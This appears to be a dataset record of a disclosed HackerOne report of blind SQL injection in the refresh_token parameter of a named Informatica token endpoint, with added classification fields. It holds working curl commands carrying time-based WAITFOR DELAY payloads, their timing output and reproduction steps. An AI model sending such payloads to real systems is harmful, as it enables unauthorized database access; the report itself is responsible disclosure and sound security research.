{
  "reported_to": "Informatica",
  "reported_by": "r1pley ",
  "title": "Blind SQL injection at tsftp.informatica.com",
  "content": "\nThe parameter refresh_token sent to the REST path /api/v1/token is vulnerable to blind SQL injection.\nCompare the response time of these 2 requests:\nCode 357 Bytes\n1$ time curl -X POST \"https://tsftp.informatica.com/api/v1/token\" -H \"accept: application/json\" -H \"Content-Type: application/x-www-form-urlencoded\" -d \"grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:1'--\"\n2{\"error\":\"invalid_grant\"}curl -X POST \"https://tsftp.informatica.com/api/v1/token\" -H  -H  -d   0.02s user 0.01s system 1% cpu 2.048 total\nvs\nCode 359 Bytes\n1$ time curl -X POST \"https://tsftp.informatica.com/api/v1/token\" -H \"accept: application/json\" -H \"Content-Type: application/x-www-form-urlencoded\" -d \"grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:13'--\"\n2{\"error\":\"invalid_grant\"}curl -X POST \"https://tsftp.informatica.com/api/v1/token\" -H  -H  -d   0.02s user 0.01s system 0% cpu 14.045 total\nand notice that the WAITFOR DELAY command is executed.\nImpact\nBlind SQL injection can be exploited to exfiltrate data from the FTP server, bypass authentication or for remote code execution.\nI stopped my testing at the time-based PoC because I didn't want to risk accessing sensitive data. If you would like to though, I can continue exploiting this vulnerability to present the above impact in practice, eg by getting the database version string.\n\n",
  "severity": [
    9.8,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "SQL Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1605540720,
  "report_url": "https://hackerone.com/reports/1034625",
  "vuln_category": "API",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "steps": [
    [
      1,
      "Send a POST request to https://tsftp.informatica.com/api/v1/token with a malicious refresh_token parameter containing a SQL injection payload (e.g., '; WAITFOR DELAY '0:0:1'--)"
    ],
    [
      2,
      "Observe the response time delay corresponding to the injected WAITFOR DELAY command, confirming SQL injection"
    ]
  ],
  "vuln_description": "The refresh_token parameter in the /api/v1/token endpoint is vulnerable to blind SQL injection, allowing attackers to execute arbitrary SQL commands and potentially exfiltrate data, bypass authentication, or achieve remote code execution.",
  "reason": "The vulnerability involves a straightforward SQL injection via a single parameter with clear time-based confirmation. No complex application states or novel logic is required - this is a classic blind SQL injection pattern.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": true
  },
  "authnz_metadata": {
    "reason": "The blind SQL injection vulnerability involves manipulating the 'refresh_token' parameter to execute time-based SQL commands, which is a different class of vulnerability from the IDOR and AuthN/AuthZ bypass methodologies described. The described methodologies focus on testing authorization boundaries by swapping user sessions and resource IDs, not on injecting malicious SQL payloads.",
    "is_detectable": false
  }
}